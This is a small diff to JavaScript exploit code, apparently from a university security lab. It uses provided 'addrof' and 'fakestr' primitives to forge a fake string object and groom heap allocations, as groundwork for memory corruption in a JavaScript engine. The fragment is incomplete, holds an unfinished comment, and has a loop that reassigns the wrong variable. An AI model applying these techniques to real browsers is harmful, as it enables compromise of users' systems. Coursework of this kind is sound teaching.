@@ -5,8 +5,9 @@ let data = new Uint32Array(1);
 let strfront = String.fromCharCode(1, 0, 0, 0, 0, 225, 245, 5, 0, 0, 0, 0, 0, 0, 0, 0);
 let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);
 
+// Need to 
 let originarray = new Uint32Array(72);
-while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944) {
+while (cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 9999944 || cs361s.addrof(originarray) < cs361s.addrof(fakestring)) {
     array = new Uint32Array(72);
 }
 
